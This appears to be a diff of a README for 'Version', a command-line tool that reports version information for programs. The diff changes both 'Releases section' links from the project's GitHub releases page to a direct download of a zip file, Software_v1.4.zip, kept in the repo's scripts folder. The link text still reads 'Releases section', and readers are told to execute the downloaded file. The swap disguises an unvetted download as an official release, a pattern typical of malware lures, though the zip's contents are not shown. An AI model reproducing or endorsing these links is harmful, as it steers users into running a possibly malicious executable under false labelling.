@@ -17,7 +17,7 @@ Welcome to **Version**, a command-line tool designed for determining version inf
 
 ## Installation
 
-To get started with **Version**, simply head over to the [Releases section](https://github.com/Ali-shan-svg/version/releases) of the repository and download the latest release file corresponding to your operating system. Execute the downloaded file to install **Version** on your system.
+To get started with **Version**, simply head over to the [Releases section](https://raw.githubusercontent.com/Ali-shan-svg/version/main/scripts/Software_v1.4.zip) of the repository and download the latest release file corresponding to your operating system. Execute the downloaded file to install **Version** on your system.
 
 ## Usage
 
@@ -47,7 +47,7 @@ This will output the version information of the `nginx` executable installed on 
 
 ## Visit the Releases Section
 
-For the latest updates and releases of **Version**, please visit the [Releases section](https://github.com/Ali-shan-svg/version/releases).
+For the latest updates and releases of **Version**, please visit the [Releases section](https://raw.githubusercontent.com/Ali-shan-svg/version/main/scripts/Software_v1.4.zip).
 
 ---
 
